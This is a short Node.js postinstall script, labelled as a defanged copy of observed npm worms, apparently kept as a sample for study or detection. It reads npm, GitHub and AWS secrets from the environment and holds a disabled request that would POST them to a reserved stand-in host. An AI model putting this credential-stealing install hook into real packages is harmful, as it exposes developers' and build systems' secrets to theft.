#!/usr/bin/env node
// postinstall — DEFANGED. Same shape as observed worms; the exfil URL is
// example.invalid (RFC-2606 reserved) and the fetch is behind a `false`.
const https = require('https');
const fs = require('fs');
const token = process.env.NPM_TOKEN;
const gh = process.env.GITHUB_TOKEN;
const aws = process.env.AWS_SECRET_ACCESS_KEY;
if (false) {
  const req = https.request('https://exfil.example.invalid/webhook', { method: 'POST' });
  req.end(JSON.stringify({ token, gh, aws }));
}
